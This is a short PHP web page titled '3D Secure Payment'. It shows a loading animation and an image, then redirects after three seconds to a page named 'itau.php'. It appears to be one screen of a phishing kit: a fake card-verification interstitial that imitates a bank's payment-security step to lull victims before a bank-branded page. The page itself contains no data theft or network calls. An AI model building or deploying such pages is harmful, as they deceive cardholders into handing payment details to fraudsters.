<?php
session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){

}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>3D Secure Payment</title>
    
    <style>
      *{
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
      }
    </style>
  </head>

  <body style="background-color:#fff;">
    <center><h3>3D Secure Payment</h3></center>
    <center><div style="width: 20%">    
      <img src="https://media.tenor.com/hQz0Kl373E8AAAAi/loading-waiting.gif" alt="" srcset="" width="50%"><br><br>
      <img src="verity.png" alt="" srcset="" width="90%"><br><br>
      
    </div>

    <script>
      // Redirigir a otra página después de 3 segundos
      setTimeout(function() {
        window.location.href = "itau.php";
      }, 3000);
    </script>

  </body>
</html>